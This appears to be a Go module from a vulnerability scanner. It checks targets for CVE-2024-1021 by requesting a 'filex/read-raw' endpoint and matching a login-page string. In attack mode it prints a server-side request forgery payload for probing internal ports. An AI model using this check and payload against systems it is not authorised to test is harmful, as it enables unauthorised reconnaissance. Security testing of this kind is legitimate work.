package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func CVE_2024_1021(url string, Attack bool) error {
	url2 := fmt.Sprintf("%s/filex/read-raw?url=1&cut=1", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url2, nil)
	if err != nil {
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}
	if strings.Contains(string(body), "用户登录") {
		fmt.Println("[*]CVE-2024-1021 : " + url)
		if Attack {
			fmt.Println("Attack-Result : 该漏洞由于仅仅支持http这种常见协议，只可用于探测端口，payload:/filex/read-raw?url=http://ip:port/&cut=1\n")
		}
	}
	defer response.Body.Close()

	return nil
}
